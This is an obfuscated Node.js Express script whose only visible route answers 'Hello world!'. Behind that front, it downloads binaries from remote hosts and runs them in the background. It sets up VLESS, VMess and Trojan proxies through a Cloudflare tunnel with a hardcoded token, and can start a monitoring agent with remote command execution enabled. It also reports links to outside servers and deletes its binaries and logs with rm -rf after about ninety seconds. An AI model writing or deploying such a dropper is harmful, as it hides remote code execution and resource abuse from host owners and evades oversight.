const _0x131d91=_0x4e61;function _0x4e61(_0x229491,_0x17a00b){const _0x179911=_0x1799();return _0x4e61=function(_0x4e6159,_0xb52343){_0x4e6159=_0x4e6159-0x17d;let _0xf30c11=_0x179911[_0x4e6159];return _0xf30c11;},_0x4e61(_0x229491,_0x17a00b);}(function(_0x5aa174,_0x2881f0){const _0x304051=_0x4e61,_0x4c622c=_0x5aa174();while(!![]){try{const _0x16cd4e=-parseInt(_0x304051(0x209))/0x1*(-parseInt(_0x304051(0x189))/0x2)+parseInt(_0x304051(0x1ba))/0x3*(-parseInt(_0x304051(0x192))/0x4)+parseInt(_0x304051(0x233))/0x5*(-parseInt(_0x304051(0x1fa))/0x6)+-parseInt(_0x304051(0x1a1))/0x7*(-parseInt(_0x304051(0x1fc))/0x8)+-parseInt(_0x304051(0x180))/0x9+parseInt(_0x304051(0x18a))/0xa*(parseInt(_0x304051(0x188))/0xb)+-parseInt(_0x304051(0x1a0))/0xc;if(_0x16cd4e===_0x2881f0)break;else _0x4c622c['push'](_0x4c622c['shift']());}catch(_0x355f52){_0x4c622c['push'](_0x4c622c['shift']());}}}(_0x1799,0x29b89));const express=require(_0x131d91(0x206)),app=express(),axios=require(_0x131d91(0x220)),os=require('os'),fs=require('fs'),path=require(_0x131d91(0x193)),{promisify}=require(_0x131d91(0x22a)),exec=promisify(require(_0x131d91(0x202))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x131d91(0x194)][_0x131d91(0x186)]||'',PROJECT_URL=process[_0x131d91(0x194)][_0x131d91(0x225)]||'',AUTO_ACCESS=process[_0x131d91(0x194)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x131d91(0x194)][_0x131d91(0x20d)]||'./tmp',SUB_PATH=process[_0x131d91(0x194)]['SUB_PATH']||_0x131d91(0x1b6),PORT=process[_0x131d91(0x194)][_0x131d91(0x1f2)]||process[_0x131d91(0x194)][_0x131d91(0x1b4)]||0xbb8,UUID=process[_0x131d91(0x194)][_0x131d91(0x1d9)]||_0x131d91(0x214),NEZHA_SERVER=process[_0x131d91(0x194)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x131d91(0x194)][_0x131d91(0x22d)]||'',NEZHA_KEY=process[_0x131d91(0x194)][_0x131d91(0x224)]||'',ARGO_DOMAIN=process[_0x131d91(0x194)][_0x131d91(0x1d6)]||_0x131d91(0x22c),ARGO_AUTH=process[_0x131d91(0x194)][_0x131d91(0x1ed)]||_0x131d91(0x1eb),ARGO_PORT=process['env']['ARGO_PORT']||0xbb8,CFIP=process['env'][_0x131d91(0x1b8)]||_0x131d91(0x222),CFPORT=process[_0x131d91(0x194)][_0x131d91(0x1d0)]||0x1bb,NAME=process['env']['NAME']||_0x131d91(0x19a);!fs[_0x131d91(0x204)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x131d91(0x1c7)](FILE_PATH+'\x20is\x20created')):console[_0x131d91(0x1c7)](FILE_PATH+_0x131d91(0x229));let npmPath=path['join'](FILE_PATH,_0x131d91(0x22f)),phpPath=path[_0x131d91(0x1ff)](FILE_PATH,_0x131d91(0x1ad)),webPath=path[_0x131d91(0x1ff)](FILE_PATH,_0x131d91(0x1c4)),botPath=path[_0x131d91(0x1ff)](FILE_PATH,'bot'),subPath=path[_0x131d91(0x1ff)](FILE_PATH,_0x131d91(0x1c0)),listPath=path[_0x131d91(0x1ff)](FILE_PATH,_0x131d91(0x216)),bootLogPath=path[_0x131d91(0x1ff)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x28f102=_0x131d91;try{if(!UPLOAD_URL)return;if(!fs[_0x28f102(0x204)](subPath))return;let _0x36ca1d;try{_0x36ca1d=fs[_0x28f102(0x21f)](subPath,_0x28f102(0x1c6));}catch{return null;}const _0x5c804f=Buffer[_0x28f102(0x18d)](_0x36ca1d,'base64')[_0x28f102(0x230)]('utf-8'),_0xcbbaaa=_0x5c804f['split']('\x0a')[_0x28f102(0x1d4)](_0x504851=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x504851));if(_0xcbbaaa['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x28f102(0x20a),JSON['stringify']({'nodes':_0xcbbaaa}),{'headers':{'Content-Type':_0x28f102(0x18f)}})[_0x28f102(0x197)](_0x68b794=>{return null;});}catch(_0x1a8d4c){return null;}}function cleanupOldFiles(){const _0x13faf4=_0x131d91,_0x2b2e70=[_0x13faf4(0x1c4),_0x13faf4(0x1bd),_0x13faf4(0x22f),_0x13faf4(0x1ad),_0x13faf4(0x1c0),_0x13faf4(0x223)];_0x2b2e70['forEach'](_0x5b4dd1=>{const _0x4b1ed9=_0x13faf4,_0x5364f8=path[_0x4b1ed9(0x1ff)](FILE_PATH,_0x5b4dd1);fs[_0x4b1ed9(0x1ca)](_0x5364f8,()=>{});});}app['get']('/',function(_0x4ff186,_0x433871){const _0x4c2fd9=_0x131d91;_0x433871[_0x4c2fd9(0x200)](_0x4c2fd9(0x190));});const config={'log':{'access':'/dev/null','error':_0x131d91(0x1db),'loglevel':_0x131d91(0x1de)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x131d91(0x1f9),'settings':{'clients':[{'id':UUID,'flow':_0x131d91(0x1fd)}],'decryption':_0x131d91(0x1de),'fallbacks':[{'dest':0xbb9},{'path':_0x131d91(0x1a8),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x131d91(0x228),'dest':0xbbc}]},'streamSettings':{'network':_0x131d91(0x1f5)}},{'port':0xbb9,'listen':_0x131d91(0x1d7),'protocol':_0x131d91(0x1f9),'settings':{'clients':[{'id':UUID}],'decryption':_0x131d91(0x1de)},'streamSettings':{'network':_0x131d91(0x1f5),'security':'none'}},{'port':0xbba,'listen':_0x131d91(0x1d7),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x131d91(0x1de)},'streamSettings':{'network':'ws','security':_0x131d91(0x1de),'wsSettings':{'path':_0x131d91(0x1a8)}},'sniffing':{'enabled':!![],'destOverride':[_0x131d91(0x1b2),'tls',_0x131d91(0x17d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x131d91(0x1d7),'protocol':_0x131d91(0x1ae),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x131d91(0x1b2),'tls',_0x131d91(0x17d)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x131d91(0x221),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x131d91(0x1de),'wsSettings':{'path':_0x131d91(0x228)}},'sniffing':{'enabled':!![],'destOverride':[_0x131d91(0x1b2),_0x131d91(0x18c),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x131d91(0x1f6),'tag':_0x131d91(0x1d1)},{'protocol':_0x131d91(0x19b),'tag':'block'}]};fs['writeFileSync'](path[_0x131d91(0x1ff)](FILE_PATH,_0x131d91(0x17f)),JSON[_0x131d91(0x1b3)](config,null,0x2));function getSystemArchitecture(){const _0x11b55e=_0x131d91,_0x4910e6=os[_0x11b55e(0x232)]();return _0x4910e6===_0x11b55e(0x1ec)||_0x4910e6===_0x11b55e(0x1be)||_0x4910e6==='aarch64'?_0x11b55e(0x1ec):'amd';}function downloadFile(_0x2a633b,_0x50154b,_0x3ea7f8){const _0x4f970c=_0x131d91,_0x452324=path[_0x4f970c(0x1ff)](FILE_PATH,_0x2a633b),_0x594a83=fs['createWriteStream'](_0x452324);axios({'method':'get','url':_0x50154b,'responseType':_0x4f970c(0x1a5)})[_0x4f970c(0x1e3)](_0x485843=>{const _0x1da5aa=_0x4f970c;_0x485843[_0x1da5aa(0x1ef)][_0x1da5aa(0x1dd)](_0x594a83),_0x594a83['on'](_0x1da5aa(0x1b1),()=>{const _0x2bebb2=_0x1da5aa;_0x594a83[_0x2bebb2(0x1a9)](),console[_0x2bebb2(0x1c7)](_0x2bebb2(0x234)+_0x2a633b+_0x2bebb2(0x183)),_0x3ea7f8(null,_0x2a633b);}),_0x594a83['on']('error',_0x11365c=>{const _0x15289a=_0x1da5aa;fs[_0x15289a(0x1ca)](_0x452324,()=>{});const _0x442d2c=_0x15289a(0x234)+_0x2a633b+'\x20failed:\x20'+_0x11365c[_0x15289a(0x19d)];console['error'](_0x442d2c),_0x3ea7f8(_0x442d2c);});})['catch'](_0x1c6626=>{const _0x313f2b=_0x4f970c,_0x42a9db='Download\x20'+_0x2a633b+_0x313f2b(0x1cb)+_0x1c6626['message'];console[_0x313f2b(0x199)](_0x42a9db),_0x3ea7f8(_0x42a9db);});}async function downloadFilesAndRun(){const _0x4ff8d4=_0x131d91,_0x142781=getSystemArchitecture(),_0x34ba1c=getFilesForArchitecture(_0x142781);if(_0x34ba1c[_0x4ff8d4(0x1ee)]===0x0){console[_0x4ff8d4(0x1c7)](_0x4ff8d4(0x1f3));return;}const _0xa4508f=_0x34ba1c[_0x4ff8d4(0x1b9)](_0x24b956=>{return new Promise((_0x4f9389,_0x1b32f9)=>{const _0x4e931b=_0x4e61;downloadFile(_0x24b956[_0x4e931b(0x182)],_0x24b956[_0x4e931b(0x20b)],(_0x38b204,_0x248582)=>{_0x38b204?_0x1b32f9(_0x38b204):_0x4f9389(_0x248582);});});});try{await Promise[_0x4ff8d4(0x213)](_0xa4508f);}catch(_0x50a128){console[_0x4ff8d4(0x199)](_0x4ff8d4(0x184),_0x50a128);return;}function _0x360b5f(_0x33d401){const _0x3c2d6d=0x1fd;_0x33d401['forEach'](_0xdf4c2c=>{const _0x2a98c1=_0x4e61,_0x2c3860=path[_0x2a98c1(0x1ff)](FILE_PATH,_0xdf4c2c);fs['existsSync'](_0x2c3860)&&fs[_0x2a98c1(0x1f8)](_0x2c3860,_0x3c2d6d,_0x117e09=>{const _0x4a52c1=_0x2a98c1;_0x117e09?console[_0x4a52c1(0x199)](_0x4a52c1(0x19e)+_0x2c3860+':\x20'+_0x117e09):console[_0x4a52c1(0x1c7)](_0x4a52c1(0x207)+_0x2c3860+':\x20'+_0x3c2d6d[_0x4a52c1(0x230)](0x8));});});}const _0xb98f57=NEZHA_PORT?[_0x4ff8d4(0x1f1),_0x4ff8d4(0x1c9),'./bot']:[_0x4ff8d4(0x1fe),'./web',_0x4ff8d4(0x218)];_0x360b5f(_0xb98f57);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d364d=NEZHA_SERVER[_0x4ff8d4(0x21a)](':')?NEZHA_SERVER['split'](':')[_0x4ff8d4(0x1ea)]():'',_0x4a62f4=new Set([_0x4ff8d4(0x1e1),_0x4ff8d4(0x1a7),_0x4ff8d4(0x1cf),_0x4ff8d4(0x195),_0x4ff8d4(0x18b),_0x4ff8d4(0x227)]),_0xd455bf=_0x4a62f4[_0x4ff8d4(0x205)](_0x3d364d)?'true':_0x4ff8d4(0x1d3),_0xa1b065=_0x4ff8d4(0x1b7)+NEZHA_KEY+_0x4ff8d4(0x21b)+NEZHA_SERVER+_0x4ff8d4(0x20f)+_0xd455bf+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4ff8d4(0x208)](path[_0x4ff8d4(0x1ff)](FILE_PATH,'config.yaml'),_0xa1b065);const _0x3e8a57='nohup\x20'+FILE_PATH+_0x4ff8d4(0x1f0)+FILE_PATH+_0x4ff8d4(0x1d2);try{await exec(_0x3e8a57),console[_0x4ff8d4(0x1c7)](_0x4ff8d4(0x19c)),await new Promise(_0x1d0163=>setTimeout(_0x1d0163,0x3e8));}catch(_0x144c65){console['error'](_0x4ff8d4(0x1ac)+_0x144c65);}}else{let _0x2c3816='';const _0x2c839e=['443',_0x4ff8d4(0x1a7),_0x4ff8d4(0x1cf),_0x4ff8d4(0x195),_0x4ff8d4(0x18b),_0x4ff8d4(0x227)];_0x2c839e['includes'](NEZHA_PORT)&&(_0x2c3816='--tls');const _0x3a1f28=_0x4ff8d4(0x219)+FILE_PATH+_0x4ff8d4(0x1c1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ff8d4(0x1b5)+NEZHA_KEY+'\x20'+_0x2c3816+_0x4ff8d4(0x19f);try{await exec(_0x3a1f28),console[_0x4ff8d4(0x1c7)](_0x4ff8d4(0x1a2)),await new Promise(_0xf92141=>setTimeout(_0xf92141,0x3e8));}catch(_0x4deeba){console[_0x4ff8d4(0x199)](_0x4ff8d4(0x1bb)+_0x4deeba);}}}else console['log'](_0x4ff8d4(0x1bf));const _0x2b0d52=_0x4ff8d4(0x219)+FILE_PATH+_0x4ff8d4(0x211)+FILE_PATH+_0x4ff8d4(0x203);try{await exec(_0x2b0d52),console[_0x4ff8d4(0x1c7)]('web\x20is\x20running'),await new Promise(_0x366676=>setTimeout(_0x366676,0x3e8));}catch(_0xb608a8){console[_0x4ff8d4(0x199)]('web\x20running\x20error:\x20'+_0xb608a8);}if(fs[_0x4ff8d4(0x204)](path[_0x4ff8d4(0x1ff)](FILE_PATH,_0x4ff8d4(0x1bd)))){let _0x146ed6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x146ed6=_0x4ff8d4(0x1e8)+ARGO_AUTH;else ARGO_AUTH[_0x4ff8d4(0x1c8)](/TunnelSecret/)?_0x146ed6='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x146ed6=_0x4ff8d4(0x1ab)+FILE_PATH+_0x4ff8d4(0x196)+ARGO_PORT;try{await exec(_0x4ff8d4(0x219)+FILE_PATH+_0x4ff8d4(0x235)+_0x146ed6+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0x4ff8d4(0x1af)),await new Promise(_0x406548=>setTimeout(_0x406548,0x7d0));}catch(_0x31f2e7){console[_0x4ff8d4(0x199)](_0x4ff8d4(0x210)+_0x31f2e7);}}await new Promise(_0x45d9ea=>setTimeout(_0x45d9ea,0x1388));}function getFilesForArchitecture(_0x3bd297){const _0x2d87f6=_0x131d91;let _0x2d7309;_0x3bd297==='arm'?_0x2d7309=[{'fileName':_0x2d87f6(0x1c4),'fileUrl':_0x2d87f6(0x1c2)},{'fileName':'bot','fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x2d7309=[{'fileName':_0x2d87f6(0x1c4),'fileUrl':_0x2d87f6(0x1e0)},{'fileName':'bot','fileUrl':_0x2d87f6(0x1cd)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xdb058f=_0x3bd297==='arm'?_0x2d87f6(0x1a6):_0x2d87f6(0x217);_0x2d7309[_0x2d87f6(0x185)]({'fileName':_0x2d87f6(0x22f),'fileUrl':_0xdb058f});}else{const _0x18461e=_0x3bd297===_0x2d87f6(0x1ec)?'https://arm64.ssss.nyc.mn/v1':_0x2d87f6(0x191);_0x2d7309[_0x2d87f6(0x185)]({'fileName':_0x2d87f6(0x1ad),'fileUrl':_0x18461e});}}return _0x2d7309;}function argoType(){const _0x1d7ed0=_0x131d91;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d7ed0(0x1c7)](_0x1d7ed0(0x212));return;}if(ARGO_AUTH[_0x1d7ed0(0x21a)](_0x1d7ed0(0x1e6))){fs['writeFileSync'](path[_0x1d7ed0(0x1ff)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4628dd=_0x1d7ed0(0x1e7)+ARGO_AUTH[_0x1d7ed0(0x18e)]('\x22')[0xb]+_0x1d7ed0(0x1da)+path[_0x1d7ed0(0x1ff)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1d7ed0(0x1f4)+ARGO_PORT+_0x1d7ed0(0x215);fs[_0x1d7ed0(0x208)](path[_0x1d7ed0(0x1ff)](FILE_PATH,_0x1d7ed0(0x1c3)),_0x4628dd);}else console['log'](_0x1d7ed0(0x1e4));}argoType();async function extractDomains(){const _0x470ce6=_0x131d91;let _0x3d83b5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3d83b5=ARGO_DOMAIN,console[_0x470ce6(0x1c7)](_0x470ce6(0x1bc),_0x3d83b5),await _0x28bfae(_0x3d83b5);else try{const _0x5b24a8=fs[_0x470ce6(0x21f)](path[_0x470ce6(0x1ff)](FILE_PATH,'boot.log'),_0x470ce6(0x1c6)),_0x144b0e=_0x5b24a8['split']('\x0a'),_0x5a8ea6=[];_0x144b0e[_0x470ce6(0x1dc)](_0x89cef=>{const _0x2ab2dc=_0x470ce6,_0x52ce88=_0x89cef[_0x2ab2dc(0x1c8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52ce88){const _0x38e12b=_0x52ce88[0x1];_0x5a8ea6['push'](_0x38e12b);}});if(_0x5a8ea6[_0x470ce6(0x1ee)]>0x0)_0x3d83b5=_0x5a8ea6[0x0],console['log'](_0x470ce6(0x1cc),_0x3d83b5),await _0x28bfae(_0x3d83b5);else{console['log'](_0x470ce6(0x21e)),fs[_0x470ce6(0x20e)](path['join'](FILE_PATH,'boot.log'));async function _0x3eaea1(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x10be9b){}}_0x3eaea1(),await new Promise(_0x3d04d3=>setTimeout(_0x3d04d3,0xbb8));const _0x513c4d=_0x470ce6(0x1ab)+FILE_PATH+_0x470ce6(0x196)+ARGO_PORT;try{await exec(_0x470ce6(0x219)+path[_0x470ce6(0x1ff)](FILE_PATH,'bot')+'\x20'+_0x513c4d+'\x20>/dev/null\x202>&1\x20&'),console['log']('bot\x20is\x20running.'),await new Promise(_0x250473=>setTimeout(_0x250473,0xbb8)),await extractDomains();}catch(_0x49cada){console[_0x470ce6(0x199)](_0x470ce6(0x210)+_0x49cada);}}}catch(_0x4816ac){console[_0x470ce6(0x199)]('Error\x20reading\x20boot.log:',_0x4816ac);}async function _0x28bfae(_0x4639d7){const _0x5ccdce=_0x470ce6,_0x4f129c=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x5ccdce(0x1c6)}),_0x52560c=_0x4f129c['trim']();return new Promise(_0x1c6c4b=>{setTimeout(()=>{const _0x1a0799=_0x4e61,_0x123fb1={'v':'2','ps':NAME+'-'+_0x52560c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1a0799(0x1de),'net':'ws','type':_0x1a0799(0x1de),'host':_0x4639d7,'path':'/vmess-argo?ed=2560','tls':_0x1a0799(0x18c),'sni':_0x4639d7,'alpn':''},_0x23be82=_0x1a0799(0x1a3)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4639d7+'&type=ws&host='+_0x4639d7+_0x1a0799(0x1d5)+NAME+'-'+_0x52560c+_0x1a0799(0x1c5)+Buffer['from'](JSON[_0x1a0799(0x1b3)](_0x123fb1))[_0x1a0799(0x230)]('base64')+_0x1a0799(0x1a4)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4639d7+_0x1a0799(0x1aa)+_0x4639d7+_0x1a0799(0x21d)+NAME+'-'+_0x52560c+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x23be82)[_0x1a0799(0x230)](_0x1a0799(0x1df))),fs['writeFileSync'](subPath,Buffer[_0x1a0799(0x18d)](_0x23be82)['toString'](_0x1a0799(0x1df))),console[_0x1a0799(0x1c7)](FILE_PATH+_0x1a0799(0x1ce)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x46e1cf,_0x434cac)=>{const _0x463d6b=_0x1a0799,_0x33191e=Buffer[_0x463d6b(0x18d)](_0x23be82)[_0x463d6b(0x230)](_0x463d6b(0x1df));_0x434cac[_0x463d6b(0x1d8)]('Content-Type',_0x463d6b(0x1e5)),_0x434cac[_0x463d6b(0x200)](_0x33191e);}),_0x1c6c4b(_0x23be82);},0x7d0);});}}async function uplodNodes(){const _0x45c25b=_0x131d91;if(UPLOAD_URL&&PROJECT_URL){const _0xe7a631=PROJECT_URL+'/'+SUB_PATH,_0x4484c0={'subscription':[_0xe7a631]};try{const _0x39063b=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x4484c0,{'headers':{'Content-Type':_0x45c25b(0x18f)}});if(_0x39063b[_0x45c25b(0x17e)]===0xc8)console[_0x45c25b(0x1c7)](_0x45c25b(0x22e));else return null;}catch(_0x2aed9f){if(_0x2aed9f[_0x45c25b(0x187)]){if(_0x2aed9f['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x45c25b(0x204)](listPath))return;const _0x7443a2=fs['readFileSync'](listPath,_0x45c25b(0x1c6)),_0x108a04=_0x7443a2[_0x45c25b(0x18e)]('\x0a')[_0x45c25b(0x1d4)](_0x2a9626=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45c25b(0x1e9)](_0x2a9626));if(_0x108a04[_0x45c25b(0x1ee)]===0x0)return;const _0x41f539=JSON[_0x45c25b(0x1b3)]({'nodes':_0x108a04});try{await axios['post'](UPLOAD_URL+_0x45c25b(0x181),_0x41f539,{'headers':{'Content-Type':_0x45c25b(0x18f)}});if(response['status']===0xc8)console[_0x45c25b(0x1c7)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x405c72){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x27d601=_0x4e61,_0x3d0473=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x3d0473['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3d0473[_0x27d601(0x20c)](phpPath);exec(_0x27d601(0x231)+_0x3d0473[_0x27d601(0x1ff)]('\x20')+'\x20>/dev/null\x202>&1',_0x4cb48f=>{const _0x337271=_0x27d601;console[_0x337271(0x1fb)](),console[_0x337271(0x1c7)](_0x337271(0x198)),console[_0x337271(0x1c7)](_0x337271(0x21c));});},0x15f90);}cleanFiles();function _0x1799(){const _0xc5e1d=['vless','30jQkRJT','clear','591688EGMIgc','xtls-rprx-vision','./php','join','send','添加URL失败:\x20','child_process','/config.json\x20>/dev/null\x202>&1\x20&','existsSync','has','express','Empowerment\x20success\x20for\x20','writeFileSync','7865PwZrWT','/api/delete-nodes','fileUrl','push','FILE_PATH','unlinkSync','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Error\x20executing\x20command:\x20','/web\x20-c\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','all','940c23d0-c69e-4e2a-8eee-058a9743ae87','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','list.txt','https://amd64.ssss.nyc.mn/agent','./bot','nohup\x20','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','readFileSync','axios','trojan','www.visa.com.sg','boot.log','NEZHA_KEY','PROJECT_URL','http\x20server\x20is\x20running\x20on\x20port:','2053','/trojan-argo','\x20already\x20exists','util','Skipping\x20adding\x20automatic\x20access\x20task','nodeserver.tyanxk.dpdns.org','NEZHA_PORT','Subscription\x20uploaded\x20successfully','npm','toString','rm\x20-rf\x20','arch','9115EzjZcC','Download\x20','/bot\x20','quic','status','config.json','2740527uXldSf','/api/add-nodes','fileName','\x20successfully','Error\x20downloading\x20files:','unshift','UPLOAD_URL','response','1475155DNubzj','80bOGAwn','20eBdRJo','2083','tls','from','split','application/json','Hello\x20world!','https://amd64.ssss.nyc.mn/v1','361916VQRCXE','path','env','2087','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','catch','App\x20is\x20running','error','Vls','blackhole','php\x20is\x20running','message','Empowerment\x20failed\x20for\x20','\x20>/dev/null\x202>&1\x20&','981420VrcLcT','7bGKPxY','npm\x20is\x20running','\x0avless://','\x0a\x20\x20\x0atrojan://','stream','https://arm64.ssss.nyc.mn/agent','8443','/vless-argo','close','&type=ws&host=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','php\x20running\x20error:\x20','php','vmess','bot\x20is\x20running','automatic\x20access\x20task\x20added\x20successfully','finish','http','stringify','PORT','\x20-p\x20','sub','\x0aclient_secret:\x20','CFIP','map','3FdwOJU','npm\x20running\x20error:\x20','ARGO_DOMAIN:','bot','arm64','NEZHA\x20variable\x20is\x20empty,skip\x20running','sub.txt','/npm\x20-s\x20','https://arm64.ssss.nyc.mn/web','tunnel.yml','web','\x0a\x20\x20\x0avmess://','utf-8','log','match','./web','unlink','\x20failed:\x20','ArgoDomain:','https://amd64.ssss.nyc.mn/2go','/sub.txt\x20saved\x20successfully','2096','CFPORT','direct','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','false','filter','&path=%2Fvless-argo%3Fed%3D2560#','ARGO_DOMAIN','127.0.0.1','set','UUID','\x0a\x20\x20credentials-file:\x20','/dev/null','forEach','pipe','none','base64','https://amd64.ssss.nyc.mn/web','443','https://oooo.serv00.net/add-url','then','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','text/plain;\x20charset=utf-8','TunnelSecret','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','test','pop','eyJhIjoiNjcyZWQ5M2M0OTY4MDgyNGQ0MzQzMzQ4YWYzYjU2N2EiLCJ0IjoiNmQ1ODE0YzAtZTNjYy00OTQ2LTg5MzktMWFjMTgwN2RhN2I1IiwicyI6Ik4yVmpOemczT1RRdE1tRTVZaTAwTm1NMExXRm1Zemt0TW1ReU56RTNNVGxsTXpoayJ9','arm','ARGO_AUTH','length','data','/php\x20-c\x20\x22','./npm','SERVER_PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tcp','freedom','listen','chmod'];_0x1799=function(){return _0xc5e1d;};return _0x1799();}async function AddVisitTask(){const _0x4e40d9=_0x131d91;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4e40d9(0x22b));return;}try{const _0xcd13b=await axios['post'](_0x4e40d9(0x1e2),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4e40d9(0x18f)}});console['log'](_0x4e40d9(0x1b0));}catch(_0x326779){console[_0x4e40d9(0x199)](_0x4e40d9(0x201)+_0x326779[_0x4e40d9(0x19d)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x131d91(0x1f7)](PORT,()=>console['log'](_0x131d91(0x226)+PORT+'!'));